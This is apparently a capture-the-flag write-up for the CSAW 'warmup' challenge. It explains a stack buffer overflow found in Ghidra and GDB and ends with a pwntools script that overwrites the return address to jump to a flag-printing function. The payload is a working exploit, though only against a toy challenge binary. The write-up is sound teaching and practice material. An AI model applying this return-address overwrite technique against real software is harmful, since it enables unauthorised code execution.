![[warmupscsaw]]

### Recon

![[Pasted image 20240507221841.png]]


![[Pasted image 20240507221935.png]]

- some address is printed out so lets view it on ghidra
### Walkthrough

- it prints the address of  a function ![[Pasted image 20240507222350.png]]
- the function prints the flag on the screen![[Pasted image 20240507222431.png]]
### Finding Vulnerability
- In 13th line, the size of local_48 to be got as input is not specified , so we can get beyond 64 and overwrite the RIP(address to be executed next) to the function calling flag before ret is called
### Exploit

- get offset between input and RIP and pad the address of flag fun at end
- set break point before ret![[Pasted image 20240507222945.png]]
- ![[Pasted image 20240507223109.png]]
- search where the input is located in stack using ==search-pattern 1234==![[Pasted image 20240507223213.png]]
- then find the address of RIP using info frame ==i f== ![[Pasted image 20240507223346.png]]
- let us find the offset using python ![[Pasted image 20240507223412.png]]
### Payload
- we have offset,address of flag func to overwrite rip 

```
from pwn import *

target = process('./warmup')
#gdb.attach(target, gdbscript = 'b *0x4006a3')

# Make the payload
payload = ""
payload += "0"*0x48 # Overflow the buffer up to the return address
payload += p64(0x40060d) # Overwrite the return address with the address of the `easy` function

# Send the payload
target.sendline(payload)

target.interactive()

```

